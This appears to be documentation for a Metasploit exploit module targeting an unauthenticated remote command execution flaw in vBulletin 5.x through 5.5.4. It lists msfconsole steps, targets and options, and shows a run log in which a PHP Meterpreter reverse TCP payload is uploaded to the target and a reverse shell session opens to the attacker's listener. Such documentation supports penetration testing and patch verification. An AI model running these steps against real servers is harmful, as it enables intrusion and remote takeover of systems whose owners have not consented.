## Introduction

vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code] parameter in an ajax/render/widget_php routestring request.

## Verification Steps

1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/multi/http/vbulletin_5x_unauth_rce`
4. Do: `set RHOSTS 192.168.0.15`
5. Do: `set LHOST 192.168.0.13`
6. Do: `run`

## Targets

```
  Id  Name
  --  ----
  0   Automatic (Dropper)
  1   Linux (Stager)
  2   Windows (Stager)
  3   Unix (In-Memory)
  4   Windows (In-Memory)
```

## Options

**PHP_CMD**

Specify the PHP function in which you want execute the payload. Defalut: shell_exec

**Proxies**

A proxy chain of format type:host:port[,type:host:port][...]. It's optional.

**RHOSTS**

The target server IP address on which vBulletin is hosted.

**RPORT**

The target server TCP port on which vBulletin is hosted. Default: 80

**SSL**

Negotiate SSL/TLS for outgoing connections. Default: false

**TARGETURI**

The base URI path of vBulletin. Default: '/'

**VHOST**

The target HTTP server virtual host.

## Usage

### Targeting (Automatic)

```
msf5 exploit(multi/http/vbulletin_5x_unauth_rce) > set rhosts 172.20.2.25
rhosts => 172.20.2.25
msf5 exploit(multi/http/vbulletin_5x_unauth_rce) > set lhost 172.20.2.13
lhost => 172.20.2.13
msf5 exploit(multi/http/vbulletin_5x_unauth_rce) > run

[*] Started reverse TCP handler on 172.20.2.13:4444
[*] Targeted operating system is: linux
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .QFJc.php
[*] Sending stage (38247 bytes) to 172.20.2.25
[*] Meterpreter session 11 opened (172.20.2.13:4444 -> 172.20.2.25:58830) at 2019-09-26 16:11:51 +0400
[!] This exploit may require manual cleanup of '.QFJc.php' on the target

meterpreter >
[+] Deleted .QFJc.php

meterpreter >
```

## References

  1. <https://seclists.org/fulldisclosure/2019/Sep/31>
